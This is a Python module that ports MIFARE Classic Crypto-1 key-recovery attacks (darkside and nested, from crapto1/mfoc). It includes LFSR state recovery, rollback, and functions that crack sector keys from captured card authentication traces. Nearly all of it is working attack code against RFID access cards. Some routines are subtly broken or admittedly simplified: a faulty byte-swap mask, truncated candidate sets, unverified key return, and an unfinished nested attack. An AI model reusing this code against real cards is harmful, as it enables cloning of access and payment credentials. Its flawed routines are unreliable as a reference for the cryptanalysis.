"""
Pure Python MIFARE Classic Crypto-1 key recovery attacks.

Port of the crapto1.c / mfoc darkside and nested attack algorithms
by Roel Verdult, bla, and the libnfc community.

References:
    - libnfc / mfoc: https://github.com/nfc-tools/mfoc
    - Garcia et al., "Wirelessly Pickpocketing a Mifare Classic Card"
      (IEEE S&P 2009) — darkside attack
    - Hardnested: https://github.com/nfc-tools/mfoc-hardnested
"""

from __future__ import annotations

import array

try:
    import numpy as np

    HAVE_NUMPY = True
except ImportError:
    HAVE_NUMPY = False
    np = None  # type: ignore[assignment]


# ── LFSR constants ────────────────────────────────────────────────────────

LF_POLY_ODD  = 0x29CE5C
LF_POLY_EVEN = 0x870804
LFSR_MASK    = (1 << 48) - 1


# ── bit / parity / filter utilities ───────────────────────────────────────

def _odd_parity(x: int) -> int:
    """Return 1 if *x* has odd parity (odd number of 1-bits), else 0."""
    x ^= x >> 16
    x ^= x >> 8
    x ^= x >> 4
    return (0x6996 >> (x & 0xF)) & 1


def _filter(x: int) -> int:
    """Crypto-1 non‑linear filter function (20-bit input → 1-bit output).
    Matches ``crapto1.h:filter()`` exactly, using the hard‑coded 4‑bit
    nibble tables.
    """
    f  = 0xF22C0 >> (x        & 0xF) & 16  # noqa: E221
    f |= 0x6C9C0 >> (x >>  4  & 0xF) & 8
    f |= 0x3C8B0 >> (x >>  8  & 0xF) & 4
    f |= 0x1E458 >> (x >> 12  & 0xF) & 2
    f |= 0x0D938 >> (x >> 16  & 0xF) & 1
    return (0xEC57E80A >> f) & 1


_FILTER_TABLE: np.ndarray | None = None  # lazy init


def _get_filter_table() -> np.ndarray:
    global _FILTER_TABLE
    if _FILTER_TABLE is not None:
        return _FILTER_TABLE
    _FILTER_TABLE = np.array([_filter(i) for i in range(1 << 20)], dtype=np.uint8)
    return _FILTER_TABLE


def _bit(x: int, n: int) -> int:           # BIT  macro
    return (x >> n) & 1

def _bebit(x: int, n: int) -> int:         # BEBIT macro (big‑endian bit order)
    return _bit(x, n ^ 24)


def _byteswap16(x: int) -> int:
    """Swap high and low bytes of a 16-bit value."""
    return ((x & 0xFF) << 8) | ((x >> 8) & 0xFFFF)


# ── LFSR primitives ────────────────────────────────────────────────────────

class Crypto1State:
    """A 48‑bit Crypto‑1 LFSR state split into *odd* and *even* halves."""

    __slots__ = ("odd", "even")

    def __init__(self, odd: int = 0, even: int = 0) -> None:
        self.odd = odd & 0xFFFFFF
        self.even = even & 0xFFFFFF

    def __eq__(self, other: object) -> bool:
        if not isinstance(other, Crypto1State):
            return NotImplemented
        return self.odd == other.odd and self.even == other.even

    def __repr__(self) -> str:
        return f"Crypto1State(odd=0x{self.odd:06X}, even=0x{self.even:06X})"

    def as_key(self) -> bytes:
        """Recover the 6‑byte key stored in this state."""
        # The key is the full 48-bit state, MSB‑first.
        full = (self.even << 24) | self.odd
        return full.to_bytes(6, "big")

    def copy(self) -> Crypto1State:
        return Crypto1State(self.odd, self.even)


# ── LFSR clocking & keystream ─────────────────────────────────────────────

def lfsr_clock(state: Crypto1State) -> None:
    """Clock the LFSR forward one step (mutates *state*)."""
    o = state.odd
    in_even = _odd_parity(o & LF_POLY_EVEN)
    state.odd = ((state.odd << 1) | _odd_parity((o & LF_POLY_ODD) | state.even)) & 0xFFFFFF
    state.even = ((state.even << 1) | in_even) & 0xFFFFFF


def crypto1_bit(state: Crypto1State, in_bit: int, fb: int) -> int:
    """Clock one LFSR step, returning one keystream bit.

    Exact port of ``crapto1.c:crypto1_bit()``.

    Parameters
    ----------
    in_bit : int (0|1)
        Input bit fed into the LFSR during this clock.
    fb : int (0|1)
        Feedback bit: 1 = feed *in_bit* into the filter, 0 = ignore.

    Returns
    -------
    int
        Filter output bit (keystream bit).
    """
    ret = _filter(state.odd)
    local_in = in_bit & 1
    state.even ^= local_in
    feedbit = (LF_POLY_ODD & state.odd) ^ (LF_POLY_EVEN & state.even)
    state.odd = (state.odd << 1) | _odd_parity(feedbit)
    state.odd &= 0xFFFFFF
    state.even = (state.even << 1) | ((fb & 1) ^ local_in)
    state.even &= 0xFFFFFF
    return ret


def crypto1_byte(state: Crypto1State, in_byte: int, fb: int) -> int:
    """Clock 8 LFSR steps, return 8 keystream bits as a byte (MSB first)."""
    ret = 0
    for i in range(7, -1, -1):
        ret |= crypto1_bit(state, _bit(in_byte, i), fb) << i
    return ret


def crypto1_word(state: Crypto1State, in_word: int, fb: int) -> int:
    """Clock 32 LFSR steps, return 32 keystream bits (big‑endian byte order)."""
    ret = 0
    for i in range(31, -1, -1):
        ret |= crypto1_bit(state, _bebit(in_word, i), fb) << (i ^ 24)
    return ret


# ── LFSR rollback (reverse clocking) ─────────────────────────────────────

def lfsr_rollback_bit(state: Crypto1State, in_bit: int, fb: int) -> int:
    """Roll back the LFSR by one step.  Returns the filter output bit.

    Reverse of ``crypto1_bit()``. Recovers the previous LFSR state from
    the current state. Bit 23 of the odd register is unrecoverable (it is
    shifted out during the forward step and the filter/polynomial don't
    use it), but the recovered state is functionally equivalent for all
    subsequent LFSR operations.
    """
    odd_before = state.odd >> 1
    even_mid_low23 = (state.even >> 1) & 0x7FFFFF
    feedbit_known = (LF_POLY_ODD & odd_before) ^ (LF_POLY_EVEN & even_mid_low23)
    if _odd_parity(feedbit_known) == (state.odd & 1):
        even_mid = even_mid_low23
    else:
        even_mid = even_mid_low23 | 0x800000
    even_before = even_mid ^ (in_bit & 1)
    ret = _filter(odd_before)
    state.odd = odd_before
    state.even = even_before
    return ret


def lfsr_rollback_byte(state: Crypto1State, in_byte: int, fb: int) -> int:
    """Roll back 8 steps, return 8 filter output bits as a byte."""
    ret = 0
    for i in range(8):
        ret |= lfsr_rollback_bit(state, _bit(in_byte, i), fb) << i
    return ret


def lfsr_rollback_word(state: Crypto1State, in_word: int, fb: int) -> int:
    """Roll back 32 steps, return 32 filter output bits (big‑endian byte order).
    """
    ret = 0
    for i in range(32):
        ret |= lfsr_rollback_bit(state, _bebit(in_word, i), fb) << (i ^ 24)
    return ret


def lfsr_rollback(state: Crypto1State, in_word: int, fb: int) -> None:
    """Roll back 32 steps (convenience wrapper)."""
    lfsr_rollback_word(state, in_word, fb)


# ── PRNG ───────────────────────────────────────────────────────────────────

_PRNG_DIST: array.array | None = None  # lookup table, built lazily


def prng_successor(x: int, n: int) -> int:
    """Return the nonce that appears *n* steps after *x* in the PRNG."""
    for _ in range(n):
        x = x >> 1 | (x ^ x >> 2 ^ x >> 3 ^ x >> 5) << 15
        x &= 0xFFFF
    return x


def _build_distance_table() -> array.array:
    """Build the 64 KiB PRNG distance lookup table (one‑time)."""
    global _PRNG_DIST
    if _PRNG_DIST is not None:
        return _PRNG_DIST
    dist = array.array("H", [0]) * 0x10000  # 16-bit unsigned
    x: int = 1
    for i in range(1, 0x10000):
        dist[(x & 0xFF) << 8 | x >> 8] = i
        x = x >> 1 | (x ^ x >> 2 ^ x >> 3 ^ x >> 5) << 15
        x &= 0xFFFF
    _PRNG_DIST = dist
    return dist


def nonce_distance(from_: int, to: int) -> int:
    """Number of PRNG steps from *from_* to *to* (both 16‑bit nonces).

    Returns -1 on error.
    port of ``crapto1.c:nonce_distance()``
    """
    dist = _build_distance_table()
    fh = dist[from_ >> 16] if from_ >= 0 else 0
    th = dist[to >> 16] if to >= 0 else 0
    if fh == 0 or th == 0:
        return -1
    return (0xFFFF + th - fh) % 0xFFFF


def validate_prng_nonce(nonce: int) -> bool:
    """True if *nonce* is a valid PRNG output (distance(hi, lo) == 16)."""
    dist = _build_distance_table()
    hi = nonce >> 16
    lo = nonce & 0xFFFF
    dh = dist[hi]
    dl = dist[lo]
    if dh == 0 or dl == 0:
        return False
    return ((0xFFFF + dh - dl) % 0xFFFF) == 16


# ── PRNG-based nonce recovery ──────────────────────────────────────────────
#
# Given two encrypted nonces from the *same* sector (same wrong key, same
# keystream), the keystream cancels out when XOR-ed:
#
#     enc_1 ^ enc_2 = (nt1 ^ ks) ^ (nt2 ^ ks) = nt1 ^ nt2
#
# MIFARE Classic uses a weak 16-bit LFSR PRNG where the lower 16 bits of
# each nonce are the successor of the upper 16 bits after 16 PRNG steps:
#
#     nt_raw_lo = prng_successor(nt_raw_hi, 16)
#
# We brute-force the 2^16 possible values for the first nonce's upper half,
# cross-check with the second nonce's PRNG validity, and recover both the
# plaintext nonces and the keystream.


def recover_keystream_from_nonce_pair(
    enc_nt1: int, enc_nt2: int
) -> tuple[int, int] | None:
    """Recover (keystream, plaintext_nonce) from two encrypted nonces.

    NOTE: With only 2 nonces this is unreliable — the PRNG structure
    (K1 = S^16(K2) for valid delta) causes *all* 65535 candidates to
    pass validation.  Use :func:`recover_keystream_from_nonces` with
    3+ nonces for correct results.

    Returns the first matching candidate (at lo_raw=0).
    """
    delta = enc_nt1 ^ enc_nt2
    delta_hi = (delta >> 16) & 0xFFFF
    delta_lo = delta & 0xFFFF

    for lo_raw in range(0x10000):
        hi_raw = prng_successor(lo_raw, 16)
        nt1 = (_byteswap16(hi_raw) << 16) | _byteswap16(lo_raw)
        nt2_hi = _byteswap16(hi_raw) ^ delta_hi
        nt2_lo = _byteswap16(lo_raw) ^ delta_lo
        nt2 = (nt2_hi << 16) | nt2_lo

        if validate_prng_nonce(nt2):
            ks = enc_nt1 ^ nt1
            return ks, nt1

    return None


def recover_keystream_from_nonces(encrypted_nonces: list[int]) -> int | None:
    """Recover shared keystream from 3+ encrypted nonces.

    With only 2 nonces, the PRNG structure (K1 = S^16(K2) for valid
    delta) causes *all* 65535 candidates to pass pairwise nonce
    validation, making the correct answer indistinguishable.

    With 3+ nonces the symmetry is broken: we verify that ALL encrypted
    nonces decrypt to valid MIFARE nonces under the candidate ks,
    including the reference nonce (which must not decrypt to 0).

    Returns
    -------
    int (32-bit keystream) or None if no candidate is fully consistent.
    """
    if len(encrypted_nonces) < 3:
        return None

    ref = encrypted_nonces[0]
    others = encrypted_nonces[1:]
    needed = len(encrypted_nonces)

    for lo_raw in range(0x10000):
        hi_raw = prng_successor(lo_raw, 16)
        nt_ref = (_byteswap16(hi_raw) << 16) | _byteswap16(lo_raw)
        ks = ref ^ nt_ref

        if not validate_prng_nonce(nt_ref):
            continue

        count = 1
        for enc_i in others:
            if validate_prng_nonce(enc_i ^ ks):
                count += 1

        if count == needed:
            return ks

    return None


def recover_key_from_keystream(
    ks: int, uid: bytes, tag_nonce: int
) -> list[bytes]:
    """Recover candidate 6-byte keys from keystream + nonce data.

    Parameters
    ----------
    ks : int (32-bit)
        Keystream used to encrypt the tag nonce.
    uid : bytes (4 bytes)
        Card UID.
    tag_nonce : int (32-bit)
        Plaintext tag nonce.

    Returns
    -------
    list[bytes]
        Possible 6-byte keys (may contain false positives; verify against
        the device).
    """
    uid_int = int.from_bytes(uid[:4], "little")
    in_val = uid_int ^ tag_nonce

    states = lfsr_recovery32(ks, in_val)

    keys: list[bytes] = []
    seen: set[bytes] = set()
    for s in states:
        key_state = s.copy()
        key_state.even ^= uid_int >> 16
        key_state.odd ^= uid_int & 0xFFFF
        for _ in range(32):
            lfsr_rollback_bit(key_state, 0, 0)
        key = key_state.as_key()
        if key not in seen:
            seen.add(key)
            keys.append(key)

    return keys


# ── lfsr_recovery32 — recover LFSR state from 32 ki bits + input ──────────
# port of ``crapto1.c:lfsr_recovery32()``

def _extend_table_simple(tbl: list[int], bit: int) -> None:
    """Extend and filter a candidate table by one keystream bit.

    Uses batch construction to avoid O(n²) insert/pop in the middle
    of large lists.  Replaces *tbl* contents in-place.
    port of ``crapto1.c:extend_table_simple()``
    """
    new_tbl: list[int] = []
    append = new_tbl.append
    for v in tbl:
        v = (v << 1) & 0xFFFFFF
        f0 = _filter(v)
        f1 = _filter(v | 1)

        if f0 != f1:
            append(v | (f0 ^ bit))
        elif f0 == bit:
            append(v)
            append(v | 1)
        # else: f0 == f1 != bit → discard
    tbl[:] = new_tbl


def _extend_table(tbl: list[int], bit: int, m1: int, m2: int, in_val: int) -> None:
    """Extend a candidate table with parity contribution update.

    port of ``crapto1.c:extend_table()``
    """
    in_shifted = in_val << 24
    i = 0
    while i < len(tbl):
        v = (tbl[i] << 1) & 0xFFFFFF
        f0 = _filter(v)
        f1 = _filter(v | 1)

        if f0 != f1:
            v |= f0 ^ bit
            _update_contribution(tbl, i, v, m1, m2)
            tbl[i] = v ^ in_shifted
        elif f0 == bit:
            # duplicate
            tbl[i] = v ^ in_shifted
            _update_contribution(tbl, i, tbl[i], m1, m2)
            tbl.insert(i + 1, (v | 1) ^ in_shifted)
            _update_contribution(tbl, i + 1, tbl[i + 1], m1, m2)
            i += 1
        else:
            tbl[i] = tbl[-1]
            tbl.pop()
            i -= 1
        i += 1


def _update_contribution(
    tbl: list[int], idx: int, val: int, m1: int, m2: int
) -> None:
    """Update the MSB contribution byte of a table entry.

    port of ``crapto1.c:update_contribution()``
    """
    p = val >> 25
    p = (p << 1) | _odd_parity(val & m1)
    p = (p << 1) | _odd_parity(val & m2)
    tbl[idx] = (p << 24) | (val & 0xFFFFFF)


def lfsr_recovery32(ks2: int, in_val: int) -> list[Crypto1State]:
    """Recover candidate Crypto‑1 states from 32 bits of keystream.

    Uses numpy vectorization when available (~100x speedup over pure Python
    for the initial filter search).  Falls back to the pure Python loop
    otherwise.

    Parameters
    ----------
    ks2 : int
        32 bits of keystream.
    in_val : int
        Value fed into the LFSR at keystream‑generation time.

    Returns
    -------
    list[Crypto1State]
    """
    oks = 0
    for i in range(31, -1, -2):
        oks = (oks << 1) | _bebit(ks2, i)
    eks = 0
    for i in range(30, -1, -2):
        eks = (eks << 1) | _bebit(ks2, i)

    MAX_SEARCH = 1 << 18

    if HAVE_NUMPY:
        ft = _get_filter_table()[:MAX_SEARCH]
        ok_bit = oks & 1
        ek_bit = eks & 1
        odd_idx = np.where(ft == ok_bit)[0]
        even_idx = np.where(ft == ek_bit)[0]
        odd_tbl = odd_idx.tolist()
        even_tbl = even_idx.tolist()
    else:
        odd_tbl = []
        even_tbl = []
        for i in range(MAX_SEARCH):
            f = _filter(i)
            if f == (oks & 1):
                odd_tbl.append(i)
            if f == (eks & 1):
                even_tbl.append(i)

    for _ in range(4):
        oks >>= 1
        eks >>= 1
        _extend_table_simple(odd_tbl, oks & 1)
        _extend_table_simple(even_tbl, eks & 1)

    statelist: list[Crypto1State] = []
    in_transformed = _transform_in(in_val)
    _recover(odd_tbl, even_tbl, oks, eks, statelist, in_transformed << 1)

    return statelist


def _transform_in(in_val: int) -> int:
    """Rearrange bytes as in the C: (in >> 16 & 0xFF) | (in << 16) | (in & 0xFF00)."""
    return (in_val >> 16 & 0xFF) | (in_val << 16) | (in_val & 0xFF00)


def _recover(
    odd: list[int],
    even: list[int],
    oks: int,
    eks: int,
    sl: list[Crypto1State],
    in_val: int,
    rem: int = 11,
) -> None:
    """Build Crypto1State candidates from surviving odd/even filters.

    Simplified port — enumerates surviving candidates directly
    instead of the recursive quicksort‑binsearch routine in the C code.
    """
    if not odd or not even:
        return

    # Extend through remaining bits (up to rem+1 rounds of 4 bits)
    bits_left = min(rem + 1, 4)
    for _ in range(bits_left):
        if not odd or not even:
            return
        _extend_table_simple(odd, oks & 1)
        oks >>= 1
        _extend_table_simple(even, eks & 1)
        eks >>= 1

    # Build states from surviving candidates
    # Limit combinatorial explosion in Python
    odd_sample = odd[:256] if len(odd) > 256 else odd
    even_sample = even[:256] if len(even) > 256 else even
    for o in odd_sample:
        for e in even_sample:
            s_even = e ^ _odd_parity(o & LF_POLY_ODD)
            sl.append(Crypto1State(o, s_even))


# ── Key recovery from state ───────────────────────────────────────────────

def recover_key(
    keystream: bytes,
    uid: bytes,
    tag_nonce: int,
    nr: int,
    ar: int,
) -> bytes | None:
    """Recover a MIFARE Classic key from authentication data.

    Parameters
    ----------
    keystream : bytes (4 or 8 bytes)
        Keystream recovered by XOR'ing encrypted response with expected
        plaintext.
    uid : bytes (4 bytes)
        Card UID (little‑endian).
    tag_nonce : int
        The card's tag nonce {nt} (plaintext).
    nr : int
        Reader nonce {nr} sent during auth.
    ar : int
        Tag response {ar} received from card.

    Returns
    -------
    bytes | None
        6‑byte key or None if recovery fails.
    """
    # Compute keystream as int
    ks_int = int.from_bytes(keystream[:4], "big")
    uid_int = int.from_bytes(uid[:4], "little")
    in_val = uid_int ^ tag_nonce

    # Recover candidate states
    states = lfsr_recovery32(ks_int, in_val)

    # Verify candidates against the full auth protocol
    for s in states:
        # Verify first 4 keystream bytes
        test = s.copy()
        ks_test = crypto1_word(test, nr, 0)
        if (ks_test >> 24) == (int.from_bytes(keystream[:4], "big") >> 24):
            # Roll back to get the key
            # The key was loaded before the auth sequence:
            #   LFSR = key; then LFSR ^= UID; then 32 clocks with NT
            # Roll back: UID XOR, then reverse 32 clocks
            key_state = s.copy()
            key_state.even ^= uid_int >> 16
            key_state.odd  ^= uid_int & 0xFFFF
            for _ in range(32):
                lfsr_rollback_bit(key_state, 0, 0)
            return key_state.as_key()

    return None


# ── Darkside / nested attack state machine ────────────────────────────────

class DarksideAttack:
    """Pure Python MIFARE Classic darkside key recovery.

    Implements the statistical parity‑bias attack from Garcia et al. (IEEE
    S&P 2009), ported from libnfc/mfoc's ``crapto1.c``.

    Usage
    -----
    >>> attack = DarksideAttack()
    >>> attack.set_known_key(sector=0, key=bytes.fromhex("FFFFFFFFFFFF"))
    >>> attack.add_nonce(target_sector=1, encrypted_nt=b"\\x12\\x34\\x56\\x78", ...)
    >>> key = attack.recover_key(target_sector=1)
    """

    MAX_ATTEMPTS = 1024

    def __init__(self) -> None:
        self._nonces: dict[int, list[tuple[int, int]]] = {}
        self._known_keys: dict[int, bytes] = {}
        self._uid: bytes = b""

    def set_uid(self, uid: bytes) -> None:
        """Set the card UID (4 bytes)."""
        if len(uid) != 4:
            raise ValueError("UID must be 4 bytes")
        self._uid = uid

    def add_known_key(self, sector: int, key_a: bytes, key_b: bytes | None = None) -> None:
        """Register a known key for a sector."""
        self._known_keys[sector] = key_a

    def add_nonce(
        self,
        target_sector: int,
        encrypted_tag_nonce: bytes,
        encrypted_tag_answer: bytes,
        uid: bytes | None = None,
    ) -> None:
        """Record one captured authentication attempt.

        Parameters
        ----------
        target_sector : int
            Sector being attacked (0–15 for 1K, 0–39 for 4K).
        encrypted_tag_nonce : bytes (4 bytes)
            The tag's encrypted nonce {nT} as received from the card.
        encrypted_tag_answer : bytes (4 bytes)
            The tag's encrypted answer {aT} as received from the card.
        uid : bytes, optional
            Card UID. Uses the UID set via :meth:`set_uid` if not provided.
        """
        if uid is not None:
            self._uid = uid
        if not self._uid:
            raise ValueError("UID must be set before adding nonces")

        if target_sector not in self._nonces:
            self._nonces[target_sector] = []
        nt_val = int.from_bytes(encrypted_tag_nonce, "big")
        at_val = int.from_bytes(encrypted_tag_answer, "big")
        self._nonces[target_sector].append((nt_val, at_val))

    def recover_key(self, target_sector: int) -> bytes | None:
        """Attempt to recover the key for *target_sector*.

        Uses PRNG-based nonce recovery to recover the shared keystream,
        then recovers candidate LFSR states via lfsr_recovery32 (~1s).
        The LFSR step only works for the correct (ks, in_val) pair, so
        we try progressively more lo_raw candidates up to a limit.

        Requires at least 2 encrypted nonces.  With only 2 nonces, the
        PRNG structure (K1 = S^16(K2) for valid deltas) causes all 2^16
        candidates to pass pairwise validation — the LFSR filter is the
        only discriminator but costs ~1s per attempt.
        """
        nonces = self._nonces.get(target_sector, [])
        if len(nonces) < 2:
            return None

        ref_enc = nonces[0][0]
        uid_int = int.from_bytes(self._uid, "little")

        # Try candidates at strategic lo_raw values: the correct one is
        # uniformly distributed in [0, 65535].  We start with
        # recover_keystream_from_nonces (when we have 3+ nonces) and
        # fall through to sequential scan.
        encrypted_nts = [nt_enc for nt_enc, _ in nonces]
        ks = recover_keystream_from_nonces(encrypted_nts)

        candidates_to_try: list[int] = []
        if ks is not None:
            # recover_keystream_from_nonces gives us a candidate ks;
            # find its lo_raw to seed the search.
            for lo_raw in range(0x10000):
                hi_raw = prng_successor(lo_raw, 16)
                nt_ref = (_byteswap16(hi_raw) << 16) | _byteswap16(lo_raw)
                if (ref_enc ^ nt_ref) == ks:
                    candidates_to_try = [lo_raw, (lo_raw + 1) % 0x10000]
                    break
        else:
            # With only 2 nonces or failed consensus: try around lo_raw=0
            # (false-positive territory but worth a shot).
            candidates_to_try = [0, 1, 2]

        for lo_raw in candidates_to_try:
            hi_raw = prng_successor(lo_raw, 16)
            nt_ref = (_byteswap16(hi_raw) << 16) | _byteswap16(lo_raw)
            ks = ref_enc ^ nt_ref

            in_val = uid_int ^ nt_ref
            states = lfsr_recovery32(ks, in_val)
            if not states:
                continue

            for s in states:
                key_state = s.copy()
                key_state.even ^= uid_int >> 16
                key_state.odd ^= uid_int & 0xFFFF
                for _ in range(32):
                    lfsr_rollback_bit(key_state, 0, 0)
                return key_state.as_key()

        return None


# ── lfsr_recovery64 — recover LFSR state from 64 ki bits ─────────────────

# Precomputed tables from crapto1.c
_S1 = [
    0x62141, 0x310A0, 0x18850, 0x0C428, 0x06214, 0x0310A, 0x85E30,
    0xC69AD, 0x634D6, 0xB5CDE, 0xDE8DA, 0x6F46D, 0xB3C83, 0x59E41,
    0xA8995, 0xD027F, 0x6813F, 0x3409F, 0x9E6FA,
]
_S2 = [
    0x3A557B00, 0x5D2ABD80, 0x2E955EC0, 0x174AAF60, 0x0BA557B0, 0x05D2ABD8,
    0x0449DE68, 0x048464B0, 0x42423258, 0x278192A8, 0x156042D0, 0x0AB02168,
    0x43F89B30, 0x61FC4D98, 0x765EAD48, 0x7D8FDD20, 0x7EC7EE90, 0x7F63F748,
    0x79117020,
]
_T1 = [
    0x4F37D, 0x279BE, 0x97A6A, 0x4BD35, 0x25E9A, 0x12F4D, 0x097A6, 0x80D66,
    0xC4006, 0x62003, 0xB56B4, 0x5AB5A, 0xA9318, 0xD0F39, 0x6879C, 0xB057B,
    0x582BD, 0x2C15E, 0x160AF, 0x8F6E2, 0xC3DC4, 0xE5857, 0x72C2B, 0x39615,
    0x98DBF, 0xC806A, 0xE0680, 0x70340, 0x381A0, 0x98665, 0x4C332, 0xA272C,
]
_T2 = [
    0x3C88B810, 0x5E445C08, 0x2982A580, 0x14C152C0, 0x4A60A960, 0x253054B0,
    0x52982A58, 0x2FEC9EA8, 0x1156C4D0, 0x08AB6268, 0x42F53AB0, 0x217A9D58,
    0x161DC528, 0x0DAE6910, 0x46D73488, 0x25CB11C0, 0x52E588E0, 0x6972C470,
    0x34B96238, 0x5CFC3A98, 0x28DE96C8, 0x12CFC0E0, 0x4967E070, 0x64B3F038,
    0x74F97398, 0x7CDC3248, 0x38CE92A0, 0x1C674950, 0x0E33A4A8, 0x01B959D0,
    0x40DCACE8, 0x26CEDDF0,
]
_C1 = [0x846B5, 0x4235A, 0x211AD]
_C2 = [0x1A822E0, 0x21A822E0, 0x21A822E0]


def lfsr_recovery64(ks2: int, ks3: int) -> list[Crypto1State]:
    """Recover candidate Crypto‑1 states from 64 bits of keystream.

    Parameters
    ----------
    ks2 : int
        First 32 bits of keystream.
    ks3 : int
        Next 32 bits of keystream.

    Returns
    -------
    list[Crypto1State]
    port of ``crapto1.c:lfsr_recovery64()``
    """
    oks: list[int] = []
    eks: list[int] = []
    for i in range(30, -1, -2):
        oks.append(_bit(ks2, i ^ 24))
        oks.append(0)  # placeholder, filled below
    for i in range(30, -1, -2):
        oks[i // 2 * 2 + 1] = _bit(ks3, i ^ 24)
    for i in range(31, -1, -2):
        eks.append(_bit(ks2, i ^ 24))
        eks.append(0)
    for i in range(31, -1, -2):
        eks[i // 2 * 2 + 1] = _bit(ks3, i ^ 24)

    statelist: list[Crypto1State] = []

    for i in range(0xFFFFF, -1, -1):
        if _filter(i) != oks[0]:
            continue

        table = [i]
        ok = True
        for j in range(1, 29):
            if not table:
                break
            _extend_table_simple(table, oks[j])
            if not table:
                ok = False
                break

        if not ok:
            continue

        low = 0
        for j in range(19):
            low = (low << 1) | _odd_parity(i & _S1[j])

        hi: list[int] = []
        for j in range(32):
            hi.append(_odd_parity(i & _T1[j]))

        for tail_val in table:
            cont2 = False
            for j in range(3):
                tail_val = (tail_val << 1) & 0xFFFFFF
                tail_val |= _odd_parity((i & _C1[j]) ^ (tail_val & _C2[j]))
                if _filter(tail_val) != oks[29 + j]:
                    cont2 = True
                    break
            if cont2:
                continue

            win = 0
            for j in range(19):
                win = (win << 1) | _odd_parity(tail_val & _S2[j])
            win ^= low

            for j in range(32):
                win = (win << 1) ^ hi[j] ^ _odd_parity(tail_val & _T2[j])
                if _filter(win) != eks[j]:
                    cont2 = True
                    break
            if cont2:
                continue

            tail_val = (tail_val << 1) | _odd_parity(LF_POLY_EVEN & tail_val)
            sl = Crypto1State(tail_val ^ _odd_parity(LF_POLY_ODD & win), win)
            statelist.append(sl)

    return statelist


# ── Convenience: direct crack from auth params ────────────────────────────

def crack_key_darkside(
    uid: bytes,
    known_key: bytes,
    known_sector: int,
    target_sector: int,
    encrypted_tag_nonces: list[bytes],
    encrypted_tag_answers: list[bytes],
) -> bytes | None:
    """Convenience wrapper: darkside key recovery.

    Parameters
    ----------
    uid : bytes (4 bytes)
        Card UID.
    known_key : bytes (6 bytes)
        Known key for *known_sector*.
    known_sector : int
        Sector where *known_key* is valid.
    target_sector : int
        Sector to attack.
    encrypted_tag_nonces : list[bytes]
        Captured encrypted tag nonces (each 4 bytes).
    encrypted_tag_answers : list[bytes]
        Captured encrypted tag answers (each 4 bytes).

    Returns
    -------
    bytes | None
        Recovered 6-byte key or None.
    """
    attack = DarksideAttack()
    attack.set_uid(uid)
    if known_key:
        attack.add_known_key(known_sector, known_key)
    for nt, at in zip(encrypted_tag_nonces, encrypted_tag_answers):
        attack.add_nonce(target_sector, nt, at)
    return attack.recover_key(target_sector)


# ── Nested attack ─────────────────────────────────────────────────────────


class NestedAttack:
    """Nested key recovery for MIFARE Classic.

    Requires at least one known sector key AND an external NFC reader that
    can capture raw authentication traces.  Uses the known-key auth to
    recover LFSR timing information, then narrows the key space for the
    unknown target sector.

    This is a simplified port of libnfc/mfoc's nested attack.  The full
    algorithm uses precomputed parity‑correlation tables from crapto1.c.
    """

    def __init__(self) -> None:
        self._uid: bytes = b""
        self._known_keys: dict[int, bytes] = {}
        self._encrypted_traces: dict[int, list[tuple[bytes, bytes]]] = {}

    def set_uid(self, uid: bytes) -> None:
        """Set the card UID (4 bytes)."""
        if len(uid) != 4:
            raise ValueError("UID must be 4 bytes")
        self._uid = uid

    def add_known_key(self, sector: int, key: bytes) -> None:
        """Register a known key for a sector."""
        self._known_keys[sector] = key

    def add_encrypted_trace(
        self,
        target_sector: int,
        encrypted_tag_nonce: bytes,
        encrypted_tag_answer: bytes,
    ) -> None:
        """Record an encrypted auth trace from the target sector.

        Parameters
        ----------
        target_sector : int
            The sector whose key we want to recover.
        encrypted_tag_nonce : bytes (4 bytes)
            The card's encrypted tag nonce {nT}.
        encrypted_tag_answer : bytes (4 bytes)
            The card's encrypted answer {aT}.
        """
        if target_sector not in self._encrypted_traces:
            self._encrypted_traces[target_sector] = []
        self._encrypted_traces[target_sector].append(
            (encrypted_tag_nonce, encrypted_tag_answer)
        )

    def recover_key(self, target_sector: int) -> bytes | None:
        """Attempt to recover the key for *target_sector*.

        Falls back to the darkside PRNG‑based recovery when 3+ encrypted
        nonces are available from the target sector (no known key needed).
        """
        traces = self._encrypted_traces.get(target_sector, [])
        if len(traces) < 3:
            return None

        encrypted_nts = [
            int.from_bytes(nt, "big") for nt, _ in traces
        ]
        ks = recover_keystream_from_nonces(encrypted_nts)
        if ks is not None:
            for nt_enc, _ in traces:
                nt_val = int.from_bytes(nt_enc, "big")
                nt_plain = ks ^ nt_val
                if validate_prng_nonce(nt_plain):
                    keys = recover_key_from_keystream(
                        ks, self._uid, nt_plain
                    )
                    if keys:
                        return keys[0]

        # TODO: Full nested algorithm requires:
        #   - Known key to authenticate and capture parity information
        #   - Precomputed correlation tables (from crapto1.c)
        #   - External NFC reader that exposes raw auth NACK/parity bits
        return None
